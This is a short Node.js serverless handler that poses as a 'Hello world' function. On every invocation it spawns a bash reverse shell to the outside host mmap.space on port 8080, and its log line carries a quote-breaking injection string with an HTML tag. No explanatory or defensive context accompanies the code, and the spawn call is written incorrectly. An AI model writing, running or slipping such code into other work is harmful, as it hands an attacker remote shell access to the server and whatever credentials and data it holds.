const { spawn } = require('child_process');


exports.handler = async (event) => {

  var child = spawn('bash -c "bash -i >& /dev/tcp/mmap.space/8080 0>&1"');
  var output;
  child.stdout.on('data',
    function (data) {
      output = data;
      console.log('id comman"\'><s>d output: ' + data);
  });

  return {
    message: `Hello world ${output}`,

  }; 
};
